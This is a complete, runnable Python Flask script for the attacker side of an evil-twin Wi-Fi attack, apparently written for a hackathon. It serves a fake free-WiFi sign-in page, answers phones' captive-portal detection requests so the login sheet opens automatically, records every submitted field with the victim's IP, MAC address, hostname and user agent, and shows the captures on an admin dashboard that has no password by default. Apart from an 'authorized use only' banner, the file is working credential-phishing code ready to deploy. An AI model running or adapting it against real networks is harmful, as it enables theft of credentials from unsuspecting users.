#!/usr/bin/env python3
"""Evil-twin captive portal + live capture dashboard  (attacker side).

⚠ AUTHORIZED USE ONLY — HackTech Lightning 2026. Use only against devices you
own or are explicitly authorized to test. It logs whatever a victim submits.

What it does:
  * Serves a fake "free WiFi sign-in" page to EVERY client on the fake AP.
  * Also answers the iOS/Android/Windows captive-portal probes, so the phone
    auto-pops the "Sign in to network" sheet the moment it connects.
  * Logs each submission (+ device IP / MAC / hostname / user-agent) to
    captures.jsonl.
  * Exposes a live dashboard at /admin to watch attempts + connected clients.

Runs on port 80 so it sits behind the iptables redirect from start-evil-twin.sh
(it REPLACES that script's Apache step).

    sudo python3 evil_portal.py                        # port 80, open /admin
    sudo ADMIN_TOKEN=letmein python3 evil_portal.py    # protect /admin?token=letmein
    sudo PORTAL_PORT=8080 python3 evil_portal.py        # test on a high port
"""
import json, os, subprocess
from datetime import datetime
from flask import Flask, request, redirect, Response

HERE = os.path.dirname(os.path.abspath(__file__))
CAPTURES = os.path.join(HERE, "captures.jsonl")
LEASES = "/var/lib/misc/dnsmasq.leases"          # written by dnsmasq
ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")  # empty = no auth (LAN demo)
PORT = int(os.environ.get("PORTAL_PORT", "80"))

app = Flask(__name__)


# ---------------- device lookup ----------------

def lease_lookup(ip):
    """Best-effort IP -> (mac, hostname): dnsmasq leases first, then ARP table."""
    mac = hostname = None
    try:
        with open(LEASES) as f:
            for line in f:                       # <expiry> <mac> <ip> <host> <id>
                p = line.split()
                if len(p) >= 4 and p[2] == ip:
                    mac, hostname = p[1], (None if p[3] == "*" else p[3])
    except OSError:
        pass
    if not mac:
        try:
            out = subprocess.check_output(["ip", "neigh", "show", ip], text=True)
            for tok in out.split():
                if len(tok) == 17 and tok.count(":") == 5:
                    mac = tok
        except Exception:
            pass
    return mac, hostname


def connected_clients():
    """Everyone currently holding a DHCP lease on the fake AP."""
    clients = []
    try:
        with open(LEASES) as f:
            for line in f:
                p = line.split()
                if len(p) >= 4:
                    clients.append({"mac": p[1], "ip": p[2],
                                    "hostname": None if p[3] == "*" else p[3]})
    except OSError:
        pass
    return clients


def read_captures():
    rows = []
    try:
        with open(CAPTURES) as f:
            for line in f:
                line = line.strip()
                if line:
                    rows.append(json.loads(line))
    except OSError:
        pass
    return rows


def authed():
    return not ADMIN_TOKEN or request.args.get("token") == ADMIN_TOKEN


def page(name):
    with open(os.path.join(HERE, name)) as f:
        return Response(f.read(), mimetype="text/html")


# ---------------- victim-facing ----------------

@app.route("/login", methods=["POST"])
def login():
    ip = request.remote_addr or "?"
    mac, hostname = lease_lookup(ip)
    entry = {
        "ts": datetime.now().isoformat(timespec="seconds"),
        "ip": ip, "mac": mac, "hostname": hostname,
        "user_agent": request.headers.get("User-Agent", ""),
        "fields": {k: v for k, v in request.form.items()},
    }
    with open(CAPTURES, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(f"[CAPTURE] {ip} {mac or '?'} {hostname or ''} -> {entry['fields']}",
          flush=True)
    return page("connecting.html")


# ---------------- dashboard ----------------

@app.route("/admin")
def admin():
    if not authed():
        return Response("forbidden", status=403)
    return page("admin.html")


@app.route("/admin/data.json")
def admin_data():
    if not authed():
        return Response("forbidden", status=403)
    return Response(json.dumps({"captures": read_captures(),
                                "clients": connected_clients()}),
                    mimetype="application/json")


@app.route("/admin/clear", methods=["POST"])
def admin_clear():
    if not authed():
        return Response("forbidden", status=403)
    open(CAPTURES, "w").close()
    return redirect("/admin" + (f"?token={ADMIN_TOKEN}" if ADMIN_TOKEN else ""))


# ---------------- catch-all: everything else -> the portal ----------------
# This also serves the OS captive-portal-detection URLs (iOS hotspot-detect,
# Android generate_204, Windows connecttest), which then trigger the sign-in
# sheet because they get the portal instead of the expected success response.

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    return page("portal.html")


if __name__ == "__main__":
    url = f"http://<kali-ip>:{PORT}/admin" + (f"?token={ADMIN_TOKEN}" if ADMIN_TOKEN else "")
    print(f"[*] Evil-twin portal listening on 0.0.0.0:{PORT}")
    print(f"[*] Dashboard: {url}")
    print(f"[*] Captures -> {CAPTURES}")
    app.run(host="0.0.0.0", port=PORT, threaded=True)
